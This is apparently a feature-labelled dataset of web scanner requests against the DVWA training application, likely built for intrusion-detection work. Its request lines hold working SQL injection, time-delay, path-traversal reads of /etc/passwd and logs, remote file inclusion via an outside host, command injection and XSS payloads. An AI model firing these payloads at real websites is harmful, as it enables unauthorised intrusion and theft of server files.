379,2,200,1250,128,72,80,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%27%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27 HTTP/1.1
352,2,200,1249,128,65,74,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%27%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27 HTTP/1.1
378,2,200,1250,61,133,85,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%5c%27%2b(select%201%20and%20row(1%2c1)%3e(select%20count(*)%2cconcat(CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))%2c0x3a%2cfloor(rand()*2))x%20from%20(select%201%20union%20select%202)a%20group%20by%20x%20limit%201))--%201 HTTP/1.1
92,2,200,1250,11,53,12,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=http%3a%2f%2fr87.com%2f%3f HTTP/1.1
82,2,200,1250,11,48,9,7,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=http://r87.com/? HTTP/1.1
76,2,200,1250,15,43,6,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=N3tSp4rK3R HTTP/1.1
71,2,200,1250,16,40,6,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=NSFTW HTTP/1.1
135,2,200,1250,11,80,20,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=php%3a%2f%2ffilter%2f%2fresource%3dhttp%3a%2f%2fr87.com%2fn%3f%00.php HTTP/1.1
79,2,200,1250,11,46,9,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=r87.com%2f%3f HTTP/1.1
77,2,200,1250,11,46,8,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=r87.com%2fn HTTP/1.1
102,2,200,1250,23,42,14,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
93,2,200,763,11,57,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=file%3a%2f%2f%2fetc%2fpasswd&security=low HTTP/1.1
75,2,200,763,15,42,6,4,0,GET /DVWA/vulnerabilities/view_help.php?id=N3tSp4rK3R&security=low HTTP/1.1
81,2,200,763,11,50,8,4,0,GET /DVWA/vulnerabilities/view_help.php?id=view_help.php%00&security=low HTTP/1.1
78,2,200,763,11,50,7,4,0,GET /DVWA/vulnerabilities/view_help.php?id=view_help.php&security=low HTTP/1.1
146,2,200,997,23,72,21,7,1,GET /DVWA/vulnerabilities/view_source.php?id='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000594)%3C/scRipt%3E&security=low HTTP/1.1
72,2,200,966,11,41,7,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2527&security=low HTTP/1.1
92,2,200,971,13,42,13,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%27%20OR%20%271%27%3d%271&security=low HTTP/1.1
94,2,200,971,13,46,13,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%27%20OR%20%27ns%27%3d%27ns&security=low HTTP/1.1
185,2,200,1035,11,92,27,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%27%2b%20(select%20convert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%20from%20syscolumns)%20%2b%27&security=low HTTP/1.1
148,2,200,1015,11,72,20,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%27%2bconvert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%2b%27&security=low HTTP/1.1
70,2,200,963,11,41,7,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%27&security=low HTTP/1.1
152,2,200,1014,14,63,21,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%27AND%201%3dcast(0x5f21403264696c656d6d61%20as%20varchar(8000))%20or%20%271%27%3d%27&security=low HTTP/1.1
164,2,200,1029,11,90,20,4,0,GET /DVWA/vulnerabilities/view_source.php?id=(select%20convert(int%2ccast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%20from%20syscolumns)&security=low HTTP/1.1
90,2,200,974,16,44,11,4,1,GET /DVWA/vulnerabilities/view_source.php?id=1%20AND%20%27NS%3d%27ss&security=low HTTP/1.1
82,2,200,971,13,42,10,4,0,GET /DVWA/vulnerabilities/view_source.php?id=-1%20OR%201%3d1&security=low HTTP/1.1
86,2,200,975,13,42,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=-1%20OR%2017-7%3d10&security=low HTTP/1.1
85,2,200,971,14,44,10,4,1,GET /DVWA/vulnerabilities/view_source.php?id=1%20OR%20X%3d%27ss&security=low HTTP/1.1
136,2,200,1013,11,70,16,4,0,GET /DVWA/vulnerabilities/view_source.php?id=convert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))&security=low HTTP/1.1
72,2,200,967,15,41,6,4,0,GET /DVWA/vulnerabilities/view_source.php?id=NS1NO&security=low HTTP/1.1
91,2,200,763,12,52,10,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%0anetsparker(0x00059E)%3b&security=low HTTP/1.1
91,2,200,763,12,52,10,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%0anetsparker(0x00059F)%3b&security=low HTTP/1.1
91,2,200,763,12,50,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%20netsparker(0x00059C)%20&security=low HTTP/1.1
91,2,200,763,12,50,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%20netsparker(0x00059D)%20&security=low HTTP/1.1
97,2,200,763,11,52,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%22%2bnetsparker(0x000596)%2b%22&security=low HTTP/1.1
97,2,200,763,11,52,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%22%2bnetsparker(0x000597)%2b%22&security=low HTTP/1.1
145,2,200,763,24,70,22,7,1,GET /DVWA/vulnerabilities/view_help.php?id='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0005A2)%3C/scRipt%3E&security=low HTTP/1.1
113,2,200,763,12,54,16,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%26%2339%3b%2bnetsparker(0x0005A0)%2b%26%2339%3b&security=low HTTP/1.1
113,2,200,763,12,54,16,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%26%2339%3b%2bnetsparker(0x0005A1)%2b%26%2339%3b&security=low HTTP/1.1
113,2,200,763,12,54,16,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%26%2339%3b%2cnetsparker(0x00059A)%2c%26%2339%3b&security=low HTTP/1.1
113,2,200,763,12,54,16,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%26%2339%3b%2cnetsparker(0x00059B)%2c%26%2339%3b&security=low HTTP/1.1
106,2,200,763,15,68,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2fDVWA%2fvulnerabilities%2fview_help.php&security=low HTTP/1.1
99,2,200,763,11,67,9,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2fvulnerabilities%2fview_help.php&security=low HTTP/1.1
106,2,200,763,11,56,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%5c%27%3bnetsparker(0x000598)%3b%2f%2f%2f&security=low HTTP/1.1
106,2,200,763,11,56,15,4,1,GET /DVWA/vulnerabilities/view_help.php?id=%5c%27%3bnetsparker(0x000599)%3b%2f%2f%2f&security=low HTTP/1.1
162,2,200,1250,24,49,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1
109,2,200,1250,23,42,17,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27)%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
110,2,200,1250,23,42,18,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27))%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
136,2,200,1250,11,62,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
139,2,200,1250,11,62,42,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00 HTTP/1.1
143,2,200,1250,11,65,43,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.php HTTP/1.1
149,2,200,1250,11,74,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror.log HTTP/1.1
149,2,200,1250,11,74,40,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror_log HTTP/1.1
139,2,200,1250,11,64,40,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2 HTTP/1.1
146,2,200,1250,11,67,42,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2%00.php HTTP/1.1
133,2,200,1250,11,63,38,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion HTTP/1.1
140,2,200,1250,11,66,40,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion%00.php HTTP/1.1
149,2,200,1250,11,74,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache%2ferror.log HTTP/1.1
150,2,200,1250,11,74,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2ferror.log HTTP/1.1
81,2,200,1250,11,51,8,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2fetc%2fpasswd HTTP/1.1
95,2,200,1250,11,52,16,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=((select%20sleep(25)))a--%201 HTTP/1.1
188,2,200,1250,11,72,73,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd HTTP/1.1
144,2,200,1250,35,47,27,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20AND%20((SELECT%201%20FROM%20(SELECT%202)a%20WHERE%201%3dsleep(25)))--%201 HTTP/1.1
225,2,200,1250,33,90,54,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
107,2,200,1250,23,42,16,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1)%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
226,2,200,1250,33,90,55,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1)%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
108,2,200,1250,23,42,17,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1))%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1
227,2,200,1250,33,90,56,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=1))%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
94,2,200,1250,11,58,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=file%3a%2f%2f%2fetc%2fpasswd HTTP/1.1
139,2,200,1250,11,65,41,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=low%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
250,2,200,1250,38,101,57,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=syscolumns%20WHERE%202%3e3%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- HTTP/1.1
79,2,200,1250,11,51,7,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=view_help.php HTTP/1.1
106,2,200,983,11,45,15,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%22%26expr%20268409241%20-%202%20%26%22&security=low HTTP/1.1
108,2,200,984,11,46,18,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%22%26ping%20-c%2025%20127.0.0.1%20%26%22&security=low HTTP/1.1
100,2,200,983,11,45,13,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%26expr%20268409241%20-%202%20%26&security=low HTTP/1.1
109,2,200,986,23,43,16,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%27%20WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1
106,2,200,984,11,45,15,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%27%26expr%20268409241%20-%202%20%26%27&security=low HTTP/1.1
140,2,200,980,11,65,40,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2&security=low HTTP/1.1
124,2,200,993,11,55,22,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%3c!--%23exec%20cmd%3d%22expr%20268409241%20-%202%22--%3e&security=low HTTP/1.1
363,2,200,1101,128,70,75,4,1,GET /DVWA/vulnerabilities/view_source.php?id=-1%20or%201%3d1%20and%20(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)&security=low HTTP/1.1
380,2,200,1108,128,73,80,4,1,GET /DVWA/vulnerabilities/view_source.php?id=-1%27%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27&security=low HTTP/1.1
71,2,200,972,11,42,7,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27 HTTP/1.1
95,2,200,972,13,47,13,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27%20OR%20%27ns%27%3d%27ns HTTP/1.1
91,2,200,972,16,45,11,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=1%20AND%20%27NS%3d%27ss HTTP/1.1
83,2,200,971,13,43,10,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=-1%20OR%201%3d1 HTTP/1.1
87,2,200,972,13,43,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=-1%20OR%2017-7%3d10 HTTP/1.1
86,2,200,972,14,45,10,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=1%20OR%20X%3d%27ss HTTP/1.1
73,2,200,972,15,42,6,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=NS1NO HTTP/1.1
97,2,200,982,11,45,12,4,0,GET /DVWA/vulnerabilities/view_source.php?id=expr%20268409241%20-%202%20%26&security=low HTTP/1.1
91,2,200,980,11,45,10,4,0,GET /DVWA/vulnerabilities/view_source.php?id=expr%20268409241%20-%202&security=low HTTP/1.1
145,2,200,763,24,70,22,7,1,GET /DVWA/vulnerabilities/view_help.php?id='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0005A3)%3C/scRipt%3E&security=low HTTP/1.1
92,2,200,763,12,48,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f%2fr87.com%2f%3f0x0005A4&security=low HTTP/1.1
92,2,200,763,12,48,11,4,0,GET /DVWA/vulnerabilities/view_help.php?id=%2f%2fr87.com%2f%3f0x0005A5&security=low HTTP/1.1
145,2,200,1250,24,71,21,7,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0005A6)%3C/scRipt%3E HTTP/1.1
145,2,200,1250,24,71,21,7,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0005A7)%3C/scRipt%3E HTTP/1.1
189,2,200,1250,27,71,24,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2527%2522--%253E%253C%252Fstyle%253E%253C%252FscRipt%253E%253CscRipt%253Enetsparker%25280x0005A8%2529%253C%252FscRipt%253E HTTP/1.1
189,2,200,1250,27,71,24,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2527%2522--%253E%253C%252Fstyle%253E%253C%252FscRipt%253E%253CscRipt%253Enetsparker%25280x0005A9%2529%253C%252FscRipt%253E HTTP/1.1
123,2,200,1250,33,42,22,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%2b((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27 HTTP/1.1
107,2,200,1250,15,69,10,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2fDVWA%2fvulnerabilities%2fview_help.php HTTP/1.1
100,2,200,1250,11,68,9,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%2fvulnerabilities%2fview_help.php HTTP/1.1
111,2,200,1250,33,40,18,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)) HTTP/1.1
125,2,200,1250,33,43,22,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)) HTTP/1.1
134,2,200,1250,33,44,25,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%22%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%22 HTTP/1.1
134,2,200,1250,33,44,25,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=-1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27 HTTP/1.1
105,2,200,1250,23,55,9,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=data%3a%3bbase64%2cTlM3NzU0NTYxNDQ2NTc1 HTTP/1.1
82,2,200,1250,11,51,8,4,0,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=view_help.php%00 HTTP/1.1
146,2,200,997,23,72,21,7,1,GET /DVWA/vulnerabilities/view_source.php?id='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000595)%3C/scRipt%3E&security=low HTTP/1.1
102,2,200,982,11,46,16,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%26ping%20-c%2025%20127.0.0.1%20%26&security=low HTTP/1.1
108,2,200,985,11,46,18,4,1,GET /DVWA/vulnerabilities/view_source.php?id=%27%26ping%20-c%2025%20127.0.0.1%20%26%27&security=low HTTP/1.1
150,2,200,986,11,75,41,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror.log&security=low HTTP/1.1
150,2,200,986,11,75,40,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror_log&security=low HTTP/1.1
147,2,200,984,11,68,42,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2%00.php&security=low HTTP/1.1
150,2,200,986,11,75,41,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache%2ferror.log&security=low HTTP/1.1
151,2,200,988,11,75,41,4,0,GET /DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2ferror.log&security=low HTTP/1.1
210,2,200,1016,67,51,43,4,0,GET /DVWA/vulnerabilities/view_source.php?id=(SELECT%20CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)))&security=low HTTP/1.1
107,2,200,986,23,43,15,4,1,GET /DVWA/vulnerabilities/view_source.php?id=1%20WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1
380,2,200,1107,128,73,80,4,1,GET /DVWA/vulnerabilities/view_source.php?id=-1%22%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%22&security=low HTTP/1.1
107,2,200,972,11,46,15,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%22%26expr%20268409241%20-%202%20%26%22 HTTP/1.1
109,2,200,972,11,47,18,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%22%26ping%20-c%2025%20127.0.0.1%20%26%22 HTTP/1.1
101,2,200,972,11,46,13,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%26expr%20268409241%20-%202%20%26 HTTP/1.1
103,2,200,972,11,47,16,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%26ping%20-c%2025%20127.0.0.1%20%26 HTTP/1.1
93,2,200,972,13,43,13,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27%20OR%20%271%27%3d%271 HTTP/1.1
107,2,200,973,11,46,15,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27%26expr%20268409241%20-%202%20%26%27 HTTP/1.1
109,2,200,972,11,47,18,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%27%26ping%20-c%2025%20127.0.0.1%20%26%27 HTTP/1.1
125,2,200,972,11,56,22,4,1,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=%3c!--%23exec%20cmd%3d%22expr%20268409241%20-%202%22--%3e HTTP/1.1
92,2,200,972,11,46,10,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=expr%20268409241%20-%202 HTTP/1.1
98,2,200,972,11,46,12,4,0,GET /DVWA/vulnerabilities/view_source.php?id=exec&security=expr%20268409241%20-%202%20%26 HTTP/1.1
101,2,200,979,11,58,14,4,0,GET /DVWA/vulnerabilities/view_source.php?id=http%3a%2f%2fr87.com%2fn%3f%00.php&security=low HTTP/1.1
98,2,200,977,11,58,13,4,0,GET /DVWA/vulnerabilities/view_source.php?id=http%3a%2f%2fr87.com%2fn%3f.php&security=low HTTP/1.1
91,2,200,977,13,52,11,4,0,GET /DVWA/vulnerabilities/view_source.php?id=hTTp%3a%2f%2fr87.com%2fn&security=low HTTP/1.1
136,2,200,991,11,81,20,4,0,GET /DVWA/vulnerabilities/view_source.php?id=php%3a%2f%2ffilter%2f%2fresource%3dhttp%3a%2f%2fr87.com%2fn%3f%00.php&security=low HTTP/1.1
99,2,200,981,11,46,15,4,0,GET /DVWA/vulnerabilities/view_source.php?id=ping%20-c%2025%20127.0.0.1%20%26&security=low HTTP/1.1
93,2,200,980,11,46,13,4,0,GET /DVWA/vulnerabilities/view_source.php?id=ping%20-c%2025%20127.0.0.1&security=low HTTP/1.1
78,2,200,971,11,47,8,4,0,GET /DVWA/vulnerabilities/view_source.php?id=r87.com%2fn&security=low HTTP/1.1
103,2,200,985,23,43,14,4,1,GET /DVWA/vulnerabilities/view_source.php?id=WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1
106,2,200,1250,13,54,14,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=%27%22%20ns%3d%20netsparker(0x0005AC)%20 HTTP/1.1
147,2,200,1250,39,74,12,4,1,GET /DVWA/vulnerabilities/view_help.php?id=exec&security=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwNUFBKTwvc2NyaXB0Pg%3d%3d HTTP/1.1
